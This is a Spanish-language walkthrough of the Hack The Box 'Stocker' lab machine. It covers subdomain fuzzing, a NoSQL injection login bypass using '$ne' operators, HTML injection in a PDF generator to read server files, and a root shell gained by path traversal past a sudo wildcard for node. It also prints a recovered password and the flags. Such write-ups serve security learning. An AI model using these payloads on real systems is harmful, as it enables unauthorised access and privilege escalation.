---
layout: single
title: Stocker - Hack The Box
excerpt: "En este post vamos a estar realizando la maquina Stocker de Hackthebox haciendo fuzzing vamos a encontrar un subdominio para poder aplicar una NoSQL injection y poder aplicar un bypass para logearnos directamente a una tienda la cual mediante Burpsuite nos daremos cuenta que podemos inyectar código HTML gracias a que la data se tramita en JSON y mediante eso obtendremos credenciales para conectarnos por SSH ala maquina para la escalada de privilegios nos aprovecharemos que tenemos un privilegio a nivel de sudoers y obtendremos una shell como root"
date: 2023-06-24
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-stocker/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - NoSQL
  - HTML Injection
  - Sudoers Privilege
  - Subdomain Enumeration
---

<p align="center">
<img src="/assets/images/htb-writeup-stocker/web24.png">
</p>

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.11.196
PING 10.10.11.196 (10.10.11.196) 56(84) bytes of data.
64 bytes from 10.10.11.196: icmp_seq=1 ttl=63 time=94.5 ms

--- 10.10.11.196 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 94.507/94.507/94.507/0.000 ms
❯ whichSystem.py 10.10.11.196

10.10.11.196 (ttl -> 63): Linux
```

## PortScan 

```bash
❯ nmap -sCV -p22,80 10.10.11.196 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 17:28 CST
Nmap scan report for 10.10.11.196
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion 

De primeras ya vemos un subdominio vamos agregarlo al **/etc/hosts** 

```bash
❯ echo "10.10.11.196 stocker.htb" | sudo tee -a /etc/hosts
10.10.11.196 stocker.htb
❯ ping -c 1 stocker.htb
PING stocker.htb (10.10.11.196) 56(84) bytes of data.
64 bytes from stocker.htb (10.10.11.196): icmp_seq=1 ttl=63 time=95.9 ms

--- stocker.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 95.894/95.894/95.894/0.000 ms
```

Estas son las tecnologías que corren en el servicio web 

```ruby
❯ whatweb http://10.10.11.196
http://10.10.11.196 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.196], RedirectLocation[http://stocker.htb], Title[301 Moved Permanently], nginx[1.18.0]
http://stocker.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.196], Meta-Author[Holger Koenemann], MetaGenerator[Eleventy v2.0.0], Script, Title[Stock - Coming Soon!], nginx[1.18.0]
```

Esta es la pagina **web** 

![](/assets/images/htb-writeup-stocker/web1.png)

Vamos aplicar **Fuzzing** para ver si encontramos algo  

```bash
❯ feroxbuster -u http://stocker.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://stocker.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       12w      178c http://stocker.htb/css
301        7l       12w      178c http://stocker.htb/js
301        7l       12w      178c http://stocker.htb/img
301        7l       12w      178c http://stocker.htb/fonts
[####################] - 1m    149995/149995  0s      found:4       errors:0      
[####################] - 1m     29999/29999   471/s   http://stocker.htb
[####################] - 1m     29999/29999   472/s   http://stocker.htb/css
[####################] - 1m     29999/29999   472/s   http://stocker.htb/js
[####################] - 1m     29999/29999   472/s   http://stocker.htb/img
[####################] - 1m     29999/29999   473/s   http://stocker.htb/fonts
```

Como no encontramos nada vamos ahora hacer **fuzzing** pero para ver si podemos encontrar subdominios existentes en la maquina 

```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://10.10.11.196/" -H "Host: FUZZ.stocker.htb" --hw 12
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.196/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000019:   302        0 L      4 W        28 Ch       "dev"     
```

Vamos agregar la ruta **dev.stocker.htb** al **/etc/hosts**

```bash
❯ cat /etc/hosts | tail -n 1
10.10.11.196 stocker.htb dev.stocker.htb
❯ ping -c 1 dev.stocker.htb
PING stocker.htb (10.10.11.196) 56(84) bytes of data.
64 bytes from stocker.htb (10.10.11.196): icmp_seq=1 ttl=63 time=191 ms

--- stocker.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 191.122/191.122/191.122/0.000 ms
```

Y bueno vemos que nos redirige a un panel de **login** 

```bash
❯ curl -s http://dev.stocker.htb
Found. Redirecting to /login
```

![](/assets/images/htb-writeup-stocker/web2.png)

Si probamos con contraseñas típicas como **admin:admin** vemos que nos muestra un error como tal es muy difícil enumerar usuarios ya que no nos esta diciendo como tal que es lo que esta mal el usuario o la contraseña solo nos dice **Invalid username or password** así que de primeras no podemos hacer gran cosa si queremos enumerar desde el panel de login usuarios o contraseñas 

![](/assets/images/htb-writeup-stocker/web3.png)

Si ingresamos una **query** para ver si de primeras es vulnerable a una inyección **SQL** vemos que no funciona 

![](/assets/images/htb-writeup-stocker/web4.png)

Antes de seguir probando inyecciones o otro tipo de ataques vamos a hacer **Fuzzing** para ver si podemos encontrar alguna otra ruta donde no necesitemos estar logueados para ver su contenido 

```bash
❯ feroxbuster -u http://dev.stocker.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.stocker.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       75l      200w     2667c http://dev.stocker.htb/login
302        1l        4w       28c http://dev.stocker.htb/logout
301       10l       16w      179c http://dev.stocker.htb/static
200       75l      200w     2667c http://dev.stocker.htb/Login
301       10l       16w      187c http://dev.stocker.htb/static/css
301       10l       16w      187c http://dev.stocker.htb/static/img
302        1l        4w       48c http://dev.stocker.htb/stock
301       10l       16w      179c http://dev.stocker.htb/Static
301       10l       16w      187c http://dev.stocker.htb/Static/css
301       10l       16w      187c http://dev.stocker.htb/Static/img
302        1l        4w       28c http://dev.stocker.htb/Logout
200       75l      200w     2667c http://dev.stocker.htb/LOGIN
```

## NoSQL 

Nada interesante como solo tenemos 2 puertos abiertos que son el **22 y 80** y solo hay este panel de login pues vamos a tener que tratar de hacer un **Bypass** asi como existen las inyecciones **SQL injection** también existen las **NoSQL Injection** así que vamos a probar

> La inyección **NoSQL** funciona de manera similar a la inyección **SQL**, pero se enfoca en las vulnerabilidades específicas de las bases de datos **NoSQL**. En una inyección **NoSQL**, el atacante aprovecha las consultas de la base de datos que se basan en **documentos** en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas, a diferencia de las inyecciones **SQL**, las inyecciones **NoSQL** explotan la falta de validación de los datos en una consulta a la base de datos **NoSQL**, en lugar de explotar las debilidades de las consultas **SQL** en las **bases de datos relacionales**

<a href='https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection' style='color: yellow'>👉Payloads all the things sobre NoSQL Injection👈</a>


<a href='https://book.hacktricks.xyz/pentesting-web/nosql-injection' style='color: yellow'>👉hacktricks sobre NoSQL Injection👈</a>

Vamos abrirnos el **Burpsuite** solo para ver como se esta enviando la data y vamos a usar **FoxyProxy** para que la petición primero llegue a nosotros y después la enviemos al servidor

```bash
❯ burpsuite &>/dev/null & disown
[1] 50859
```

Una vez puesto **admin:admin** en los campos del panel de login y darle a **Sign in** nos llega la petición

![](/assets/images/htb-writeup-stocker/web5.png)

Vemos que esta usando **Express**

![](/assets/images/htb-writeup-stocker/web6.png)

Lo que podemos hacer es cambiar el **Content-Type** a formato **JSON** como la mayoría de Inyecciones NSQL son y también cambiar la forma en la que se tramita la solicitud a **JSON** si enviamos la petición vemos que aun así nos funciona

![](/assets/images/htb-writeup-stocker/web7.png)

Podemos intentar esto `{"username": {"$ne": null}, "password": {"$ne": null} }`

![](/assets/images/htb-writeup-stocker/web8.png)

Si la copeamos y la pegamos en el **Burpsuite** vemos que nos redirige a **stock** eso significa que hemos saltado el panel de **login** en la **query** basicamente le estamos indicando que el usuario no es **null** y la contraseña no es **null** como la **query** es **True** nos va a loguear

![](/assets/images/htb-writeup-stocker/web9.png)

Como sabemos esto vamos a hacerlo desde aquí para darle a **Forward** y estar logueados en la parte de la web 

![](/assets/images/htb-writeup-stocker/web10.png)

Ahora estamos dentro y vemos lo siguiente

![](/assets/images/htb-writeup-stocker/web11.png)

Aquí vemos productos 

![](/assets/images/htb-writeup-stocker/web12.png)

Vamos añadir lo que sea al carrito 

![](/assets/images/htb-writeup-stocker/web13.png)

Si le damos en **Submit Purchase** vemos que nos da un **ID** y nos da un **link** para ver nuestra compra

![](/assets/images/htb-writeup-stocker/web14.png)

Si abrimos el **link** en una pestaña aparte vemos los datos de la compra y tenemos un usuario el cual es la persona la que realizo la compra se llama **Angoose** 

![](/assets/images/htb-writeup-stocker/web15.png)

Bueno es un **PDF** vamos a capturar con **Burpsuite** la petición en el momento cuando damos click en **Submit Purchase**

![](/assets/images/htb-writeup-stocker/web16.png)

Nos llega la petición y vemos que básicamente esta en **json**

![](/assets/images/htb-writeup-stocker/web17.png)

Lo que podemos hacer es ver si podemos cambiar por ejemplo el nombre del producto ya que si eso se ve reflejado ya podremos enumerar mediante eso vamos a inyectar código **HTML** en la parte del nombre del producto vamos a decirle que queremos cargar un archivo para ver si no lo representa

![](/assets/images/htb-writeup-stocker/web18.png)

Una vez la demás a **Forward** y regresamos ala web nos dan las gracias por comprar y si abrimos el link en una ventana aparte vemos el contenido

![](/assets/images/htb-writeup-stocker/web19.png)

Bueno solo podemos ver ese recuadro por que si se esta interpretando el **HTML** así que ahora lo que podemos hacer es darle mas espacio de la siguiente forma primero vamos a emitir la petición al **repeater**

![](/assets/images/htb-writeup-stocker/web20.png)

Ahora si vemos mucho mas contenido 

![](/assets/images/htb-writeup-stocker/web21.png)

Bueno después de estar enumerando mediante esto para poder leer archivos hay que recordar que tenemos el nombre de un usuario pero si tratamos de ver su **id_rsa** no podremos por que lo mas probable es que no tenemos capacidad de escritura asi que como se esta usando pero también sabemos que se esta usando **Node.JS** y la ruta **/var/www/dev** también si vemos el contenido de **index.js** suponiendo que así se llama el archivo con el código fuente vemos credenciales, también mediante el archivo **/etc/passwd** hay un usuario **mongodb** y eso significa que deben de haber credenciales para eso 

Si hacemos la petición inyectando el codigo **HTML** vemos que si funciona así que ahora vamos a ver si podemos ver algo de ese archivo 

![](/assets/images/htb-writeup-stocker/web22.png)

![](/assets/images/htb-writeup-stocker/web23.png)

Tenemos credenciales **IHeardPassphrasesArePrettySecure** 

## Shell as Angoose

Nos podemos conectar 

```bash
❯ ssh angoose@10.10.11.196
The authenticity of host '10.10.11.196 (10.10.11.196)' can't be established.
ECDSA key fingerprint is SHA256:DX/9+PB1w20dghcXwm9QPFH88qM0aiPr+RyA+wzHnng.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.196' (ECDSA) to the list of known hosts.
angoose@10.10.11.196's password: 
angoose@stocker:~$ export TERM=xterm
angoose@stocker:~$ 
```

## User flag 

```bash
angoose@stocker:~$ cat user.txt 
ab73456128ffaa11e99e86196ebdbe36
angoose@stocker:~$ 
```

## Escalada de privilegios

Si buscamos por privilegios **SUID** no vemos nada 

```bash
angoose@stocker:/$ find \-perm -4000 2>/dev/null
./opt/google/chrome/chrome-sandbox
./usr/bin/gpasswd
./usr/bin/newgrp
./usr/bin/umount
./usr/bin/at
./usr/bin/mount
./usr/bin/sudo
./usr/bin/chfn
./usr/bin/chsh
./usr/bin/fusermount
./usr/bin/su
./usr/bin/passwd
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/snapd/snap-confine
angoose@stocker:/$ 
```

Si hacemos un **sudo -l** podemos correr con **node** como cualquier usuario lo que hay dentro de **scripts** y termine con **.js**  

```bash
angoose@stocker:/$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:/$ 
```

Vemos esto de primeras que esta dentro del directorio **scripts**

```bash
angoose@stocker:/$ ls -l /usr/local/scripts/
total 24
-rwxr-x--x 1 root root  245 Dec  6  2022 creds.js
-rwxr-x--x 1 root root 1625 Dec  6  2022 findAllOrders.js
-rwxr-x--x 1 root root  793 Dec  6  2022 findUnshippedOrders.js
drwxr-xr-x 2 root root 4096 Dec  6  2022 node_modules
-rwxr-x--x 1 root root 1337 Dec  6  2022 profitThisMonth.js
-rwxr-x--x 1 root root  623 Dec  6  2022 schema.js
angoose@stocker:/$ 
```

Podemos guiarnos con esto y hacer un script en **.js** 

<a href='https://www.stackhawk.com/blog/nodejs-command-injection-examples-and-prevention/' color='yellow'>👉nodejs-command-injection-examples-and-prevention👈</a>

Vamos a decirle que nos de una **bash**

```bash
angoose@stocker:/tmp$ nano pwned.js
angoose@stocker:/tmp$ cat pwned.js 
require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})
angoose@stocker:/tmp$ 
```

## Shell as root && root.txt 

Ahora lo vamos a correr y funciona

```bash
angoose@stocker:/tmp$ cd
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/pwned.js 
root@stocker:/home/angoose# whoami
root
root@stocker:/home/angoose# 
root@stocker:~# cat root.txt 
fd685a1caa10ad12c7f833390ebfde1d
root@stocker:~# 
```
